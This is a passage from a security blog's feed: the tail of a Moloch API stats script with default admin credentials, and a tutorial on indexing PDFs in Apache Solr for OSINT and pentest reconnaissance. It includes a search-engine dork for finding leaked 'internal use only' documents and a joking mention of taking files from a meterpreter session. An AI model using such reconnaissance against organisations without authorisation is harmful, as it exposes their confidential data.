</span><span class='line'><span class="n">MOLOCH_URL</span> <span class="o">=</span> <span class="s">&#39;https://192.168.1.39:8005&#39;</span>
</span><span class='line'><span class="n">MOLOCH_USER</span> <span class="o">=</span> <span class="s">&#39;admin&#39;</span>
</span><span class='line'><span class="n">MOLOCH_PASSWORD</span> <span class="o">=</span> <span class="s">&#39;admin&#39;</span>
</span><span class='line'><span class="n">MOLOCH_REALM</span> <span class="o">=</span> <span class="s">&#39;Moloch&#39;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Set up authentication</span>
</span><span class='line'>    <span class="n">auth_handler</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPDigestAuthHandler</span><span class="p">()</span>
</span><span class='line'>    <span class="n">auth_handler</span><span class="o">.</span><span class="n">add_password</span><span class="p">(</span><span class="n">MOLOCH_REALM</span><span class="p">,</span> <span class="n">MOLOCH_URL</span><span class="p">,</span> <span class="n">MOLOCH_USER</span><span class="p">,</span> <span class="n">MOLOCH_PASSWORD</span><span class="p">)</span>
</span><span class='line'>    <span class="n">opener</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">auth_handler</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
</span><span class='line'>        <span class="n">response</span> <span class="o">=</span> <span class="n">opener</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%s</span><span class="s">/esstats.json&#39;</span> <span class="o">%</span> <span class="n">MOLOCH_URL</span><span class="p">)</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span><span class='line'>            <span class="c"># Read html response and transform to JSON</span>
</span><span class='line'>            <span class="n">plain_answer</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>            <span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">plain_answer</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>            <span class="c"># Extract info</span>
</span><span class='line'>            <span class="n">node_name</span> <span class="o">=</span> <span class="n">json_data</span><span class="p">[</span><span class="s">&#39;aaData&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">&#39;name&#39;</span><span class="p">]</span>
</span><span class='line'>            <span class="n">documents_num</span> <span class="o">=</span> <span class="n">json_data</span><span class="p">[</span><span class="s">&#39;aaData&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">&#39;docs&#39;</span><span class="p">]</span>
</span><span class='line'>            <span class="n">searches_num</span> <span class="o">=</span> <span class="n">json_data</span><span class="p">[</span><span class="s">&#39;aaData&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">&#39;searches&#39;</span><span class="p">]</span>
</span><span class='line'>            <span class="n">searches_time_total</span> <span class="o">=</span> <span class="n">json_data</span><span class="p">[</span><span class="s">&#39;aaData&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">&#39;searchesTime&#39;</span><span class="p">]</span> <span class="c"># milliseconds</span>
</span><span class='line'>            <span class="n">store_size_bytes</span> <span class="o">=</span> <span class="n">json_data</span><span class="p">[</span><span class="s">&#39;aaData&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">&#39;storeSize&#39;</span><span class="p">]</span> <span class="c"># bytes</span>
</span><span class='line'>
</span><span class='line'>            <span class="c"># Show it</span>
</span><span class='line'>            <span class="n">store_size_mb</span> <span class="o">=</span> <span class="n">store_size_bytes</span> <span class="o">/</span> <span class="p">(</span><span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>            <span class="n">searches_time_average_seconds</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="n">searches_time_total</span> <span class="o">/</span> <span class="n">searches_num</span><span class="p">)</span><span class="o">/</span><span class="mi">1000</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;[*] Some statistics about elasticsearch at node &quot;</span><span class="si">%s</span><span class="s">&quot;&#39;</span> <span class="o">%</span> <span class="n">node_name</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;   [+] There are </span><span class="si">%i</span><span class="s"> indexed documents within </span><span class="si">%i</span><span class="s"> MB of index&#39;</span>\
</span><span class='line'>                  <span class="o">%</span> <span class="p">(</span><span class="n">documents_num</span><span class="p">,</span> <span class="n">store_size_mb</span><span class="p">)</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;   [+] This elasticsearch node has served up </span><span class="si">%i</span><span class="s"> queries with an average</span><span class="se">\</span>
</span><span class='line'><span class="s">            of </span><span class="si">%f</span><span class="s"> seconds per query&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">searches_num</span><span class="p">,</span> <span class="n">searches_time_average_seconds</span><span class="p">)</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;[-]&#39;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>        <span class="k">raise</span> <span class="n">e</span>
</span></code></pre></td></tr></table></div></figure>


<p>
This simple code will show something similar to this:</p>

<figure class='code'><figcaption><span>Output for moloch_api_example.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python moloch_api_example.py
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Some statistics about elasticsearch at node <span class="s2">&quot;molocha&quot;</span>
</span><span class='line'>   <span class="o">[</span>+<span class="o">]</span> There are 1624416 indexed documents within 963 MB of index
</span><span class='line'>   <span class="o">[</span>+<span class="o">]</span> This elasticsearch node has served up 1042 queries with an average of 0.012000 seconds per query
</span><span class='line'><span class="o">[</span>-<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>That is all for now, hope you liked this and find it useful, i think moloch is a really powerful tool and will turn to a must-have in network forensics as well as saving us countless hours when dealing with big amounts of network traffic.</p>

<p>See you soon!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Indexing PDF for OSINT and pentesting]]></title>
    <link href="http://blog.alejandronolla.com/2013/03/23/indexing-pdf-for-osint-and-pentesting/"/>
    <updated>2013-03-23T10:26:00+01:00</updated>
    <id>http://blog.alejandronolla.com/2013/03/23/indexing-pdf-for-osint-and-pentesting</id>
    <content type="html"><![CDATA[<p>Most of us, when conducting OSINT tasks or gathering information for preparing a pentest, draw on Google hacking techniques like <strong>site:company.acme filetype:pdf &#8220;for internal use only&#8221;</strong> or something similar to search for potential sensitive information uploaded by mistake. Other times, a customer ask us to know if they have leaked in a negligence this kind of sensitive information and we proceed to make some google hacking fu. <br/>
But, what happens if we don&#8217;t want to make this queries against Google and, furthermore, follow links from search that could potentially leak referers? Sure we could download documents and review them manually in local but it&#8217;s boring and time consuming. Here is where <a href="http://lucene.apache.org/solr/">Apache Solr</a> comes into play for processing documents and create index of them to give us almost real time searching capabilities.<!-- more --></p>

<h2>What is Solr?</h2>

<p>Solr is a schema based (also with dynamics field support) search solution built upon Apache Lucene providing full-text searching capabilities, document processing, REST API to fetch results in various formats like XML or JSON, etc.  Solr allows us to process document indexing with multiple options regarding of how to treat text, how to tokenize it, convert (or not) to lowercase automatically, build distributed cluster, automatic duplicates document detection and so.</p>

<h2>Setting up Solr</h2>

<p>There are a lot of stuff about how to install Solr so i&#8217;m not going to cover it, just specific core options for this quick&#8217;n dirty solution. First thing to do is creating core config and data dir, in this case i created <em>/opt/solr/pdfosint/</em> and <em>/opt/solr/pdfosintdata/</em> to store config and document data respectively.</p>

<p>To set schema up just create <em>/opt/solr/pdfosint/conf/schema.xml</em> file with following content:</p>

<figure class='code'><figcaption><span>schema.xml content for pdfosint core</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
</span><span class='line'><span class="nt">&lt;schema</span> <span class="na">name=</span><span class="s">&quot;pastebincom&quot;</span> <span class="na">version=</span><span class="s">&quot;1.5&quot;</span><span class="nt">&gt;</span>
</span><span class='line'> <span class="nt">&lt;fields&gt;</span>
</span><span class='line'>   <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;id&quot;</span> <span class="na">type=</span><span class="s">&quot;uuid&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;true&quot;</span> <span class="na">default=</span><span class="s">&quot;NEW&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>   <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;text&quot;</span> <span class="na">type=</span><span class="s">&quot;text_general&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;true&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>   <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;timestamp&quot;</span> <span class="na">type=</span><span class="s">&quot;date&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;true&quot;</span> <span class="na">default=</span><span class="s">&quot;NOW&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>   <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;_version_&quot;</span> <span class="na">type=</span><span class="s">&quot;long&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;true&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>   <span class="nt">&lt;dynamicField</span> <span class="na">name=</span><span class="s">&quot;attr_*&quot;</span> <span class="na">type=</span><span class="s">&quot;text_general&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;true&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;true&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'> <span class="nt">&lt;/fields&gt;</span>
</span><span class='line'>
</span><span class='line'> <span class="nt">&lt;types&gt;</span>
</span><span class='line'>   <span class="nt">&lt;fieldType</span> <span class="na">name=</span><span class="s">&quot;string&quot;</span> <span class="na">class=</span><span class="s">&quot;solr.StrField&quot;</span> <span class="na">sortMissingLast=</span><span class="s">&quot;true&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>   <span class="nt">&lt;fieldType</span> <span class="na">name=</span><span class="s">&quot;long&quot;</span> <span class="na">class=</span><span class="s">&quot;solr.TrieLongField&quot;</span> <span class="na">precisionStep=</span><span class="s">&quot;0&quot;</span> <span class="na">positionIncrementGap=</span><span class="s">&quot;0&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>   <span class="nt">&lt;fieldType</span> <span class="na">name=</span><span class="s">&quot;date&quot;</span> <span class="na">class=</span><span class="s">&quot;solr.TrieDateField&quot;</span> <span class="na">precisionStep=</span><span class="s">&quot;0&quot;</span> <span class="na">positionIncrementGap=</span><span class="s">&quot;0&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>   <span class="nt">&lt;fieldType</span> <span class="na">name=</span><span class="s">&quot;uuid&quot;</span> <span class="na">class=</span><span class="s">&quot;solr.UUIDField&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>   <span class="nt">&lt;fieldType</span> <span class="na">name=</span><span class="s">&quot;text_general&quot;</span> <span class="na">class=</span><span class="s">&quot;solr.TextField&quot;</span> <span class="na">positionIncrementGap=</span><span class="s">&quot;100&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;analyzer</span> <span class="na">type=</span><span class="s">&quot;index&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>        <span class="nt">&lt;tokenizer</span> <span class="na">class=</span><span class="s">&quot;solr.WhitespaceTokenizerFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>        <span class="nt">&lt;filter</span> <span class="na">class=</span><span class="s">&quot;solr.LowerCaseFilterFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>      <span class="nt">&lt;/analyzer&gt;</span>
</span><span class='line'>      <span class="nt">&lt;analyzer</span> <span class="na">type=</span><span class="s">&quot;query&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>        <span class="nt">&lt;tokenizer</span> <span class="na">class=</span><span class="s">&quot;solr.WhitespaceTokenizerFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>        <span class="nt">&lt;filter</span> <span class="na">class=</span><span class="s">&quot;solr.LowerCaseFilterFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>      <span class="nt">&lt;/analyzer&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/fieldType&gt;</span>
</span><span class='line'> <span class="nt">&lt;/types&gt;</span>
</span><span class='line'><span class="nt">&lt;/schema&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Just a quick review of config for schema.xml, i specified an id field to be unique (UUID), a text field to store text itself, timestamp to be setted to date when document is pushed into Solr, <em>version</em> to track index version (internal Solr use to replicate, and so) and a dynamic field named attr_* to store any no specified value in schema and provided by parser. At last, i specified how to treat indexing and querying, for tokenize i use whitespice (splice words based just on whitespace without caring about special punctuaction) and convert it to lowercase. If you want to know more about text processing i would recommend <a href="http://www.packtpub.com/python-text-processing-nltk-20-cookbook/book">Python Text Processing with NLTK 2.0 Cookbok</a> as an introduction, <a href="http://shop.oreilly.com/product/9780596516499.do">Natural Language Processing with Python</a> for a more in-depth usage (both Python based) and <a href="https://www.coursera.org/course/nlangp">Natural Language Processing</a> online course available in Coursera.</p>

<p>Next step is notyfing Solr about new core, just adding to <em>/opt/solr/solr.xml/</em></p>

<figure class='code'><figcaption><span>new core for PDF indexing</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;cores&gt;</span>
</span><span class='line'>  ...
</span><span class='line'>  <span class="nt">&lt;core</span> <span class="na">name=</span><span class="s">&quot;pdfosint&quot;</span> <span class="na">instanceDir=</span><span class="s">&quot;pdfosint&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;/cores&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now only left to provide Solr with binary document processing capabilities through a <a href="http://wiki.apache.org/solr/SolrRequestHandler">request handler</a>, in that case, only for <em>pdfosint</em> core. For this create <em>/opt/solr/pdfosint/solrconfig.xml</em> (we can always copy provided example with Solr and modify when needed) and specify request handler:</p>

<figure class='code'><figcaption><span>setting up solr request handler for binary documents</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'>  <span class="nt">&lt;requestHandler</span> <span class="na">name=</span><span class="s">&quot;/update/extract&quot;</span> <span class="na">class=</span><span class="s">&quot;org.apache.solr.handler.extraction.ExtractingRequestHandler&quot;</span> <span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;lst</span> <span class="na">name=</span><span class="s">&quot;defaults&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>        <span class="nt">&lt;str</span> <span class="na">name=</span><span class="s">&quot;fmap.content&quot;</span><span class="nt">&gt;</span>text<span class="nt">&lt;/str&gt;</span>
</span><span class='line'>        <span class="nt">&lt;str</span> <span class="na">name=</span><span class="s">&quot;lowernames&quot;</span><span class="nt">&gt;</span>true<span class="nt">&lt;/str&gt;</span>
</span><span class='line'>        <span class="nt">&lt;str</span> <span class="na">name=</span><span class="s">&quot;uprefix&quot;</span><span class="nt">&gt;</span>attr_<span class="nt">&lt;/str&gt;</span>
</span><span class='line'>        <span class="nt">&lt;str</span> <span class="na">name=</span><span class="s">&quot;captureAttr&quot;</span><span class="nt">&gt;</span>true<span class="nt">&lt;/str&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/lst&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/requestHandler&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>A quick review of this, class could changed depending on version and classes names, fmap.content specify to index extracted text to a field called <em>text</em>, lowernames specify converting to lowercase all processed documents, uprefix specify how to handled field parsed and not provided in schema.xml (in that case use dynamic attribute with a suffix of <em>attr_</em>) and captureAttr to specify indexing parsed attributes into separate fields. To know more about ExtractingRequestHandler <a href="http://wiki.apache.org/solr/ExtractingRequestHandler">here</a>.<br/>
Now we have to install required libraries to do binary parsing and indexing, for this, i have created <em>/opt/solr/extract/</em> and copied <em>solr-cell-4.2.0.jar</em> from <em>dist</em> directory inside of Solr distribution archive and also copied to the same folder everything from <em>contrib/extraction/lib/</em> again from distribution archive.</p>

<p>At last, adding this line to <em>/opt/solr/pdfosint/solrconfix.xml</em> to specify from where load libraries:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'>...
</span><span class='line'><span class="nt">&lt;lib</span> <span class="na">dir=</span><span class="s">&quot;/opt/solr/extract&quot;</span> <span class="na">regex=</span><span class="s">&quot;.*\.jar&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>...
</span></code></pre></td></tr></table></div></figure>


<p>To know more about this process and more recipes, i strongly recommend <a href="http://www.packtpub.com/apache-solr-4-cookbook/book">Apache Solr 4 Cookbook</a>.</p>

<h2>Indexing and digging data</h2>

<p>Now we have a extracting and indexing handler at <em>http://localhost:8080/solr/pdfosint/update/extract/</em> so only rest to send PDF to Solr and analyze them. The easyiest way once downloaded (or maybe  fetched from a meterpreter session? }:) ) is sending them with curl to Solr:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="k">for </span>i in <span class="sb">`</span>ls /tmp/pdf/*.pdf<span class="sb">`</span>; <span class="k">do </span>curl <span class="s2">&quot;http://localhost:8080/solr/pdfosint/update/extract/?commit=true&quot;</span> -F <span class="s2">&quot;myfile=@$i&quot;</span>; <span class="k">done</span>;
</span></code></pre></td></tr></table></div></figure>


<p>After a while, depending on several factors like machine specs and documents size, we should have an index like this:
<img src="http://blog.alejandronolla.com/images/upload/2013/03/solr_index.png"></p>

<p>So now we try a query to find documents with phrase <em>&#8220;internal use only&#8221;</em> and bingo!:
<img src="http://blog.alejandronolla.com/images/upload/2013/03/solr_query.png"></p>

<p>It&#8217;s important to have in mind the fact that Solr split words and treat them before indexing when doing queries, to see how a phrase should be treated and indexed by Solr when submitted we can do an analysis with builtin interface:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/03/solr_analysis.png"></p>

<p>I hope you find it useful and give it a try, see you soon!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Embrace yourselves, blog is coming...]]></title>
    <link href="http://blog.alejandronolla.com/2013/03/18/embrace-yourselves/"/>
    <updated>2013-03-18T23:45:00+01:00</updated>
    <id>http://blog.alejandronolla.com/2013/03/18/embrace-yourselves</id>
    <content type="html"><![CDATA[<p>I have decided to give a try to octopress for setting up a basic blog to publish some stuff hopefully useful to someone.</p>
]]></content>
  </entry>
  
</feed>
